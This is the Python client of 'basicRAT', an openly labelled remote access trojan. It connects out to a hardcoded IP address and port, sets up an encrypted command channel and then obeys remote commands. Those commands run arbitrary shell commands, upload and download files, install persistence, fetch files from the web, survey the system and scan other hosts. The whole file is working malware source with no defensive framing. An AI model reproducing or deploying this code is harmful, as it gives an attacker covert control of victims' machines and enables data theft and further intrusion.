#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import sys

from core import crypto
from core import filesock
from core import persistence
from core import scan
from core import survey
from core import toolkit


PLAT = sys.platform
HOST = '208.68.38.5'
PORT = 51337


def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    dh_key  = crypto.diffiehellman(s)
    GCM     = crypto.AES_GCM(dh_key)
    IV      = 0

    s.setblocking(0)

    while True:
        data = crypto.recvGCM(s, GCM)
        if not data:
            continue

        IV += 1

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'kill':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            crypto.sendGCM(s, GCM, IV, results)

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                filesock.sendfile(s, GCM, IV, fname)

        # receive file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                filesock.recvfile(s, GCM, fname)

        # regenerate DH key
        elif cmd == 'rekey':
            dh_key = crypto.diffiehellman(s)

        # apply persistence mechanism
        elif cmd == 'persistence':
            results = persistence.run(PLAT)
            crypto.sendGCM(s, GCM, IV, results)

        # download a file from the web
        elif cmd == 'wget':
            results = toolkit.wget(action)
            crypto.sendGCM(s, GCM, IV, results)

        # unzip a file
        elif cmd == 'unzip':
            results = toolkit.unzip(action)
            crypto.sendGCM(s, GCM, IV, results)

        # run system survey
        elif cmd == 'survey':
            results = survey.run(PLAT)
            crypto.sendGCM(s, GCM, IV, results)

        # run a scan
        elif cmd == 'scan':
            results = scan.single_host(action)
            crypto.sendGCM(s, GCM, IV, results)


if __name__ == '__main__':
    main()
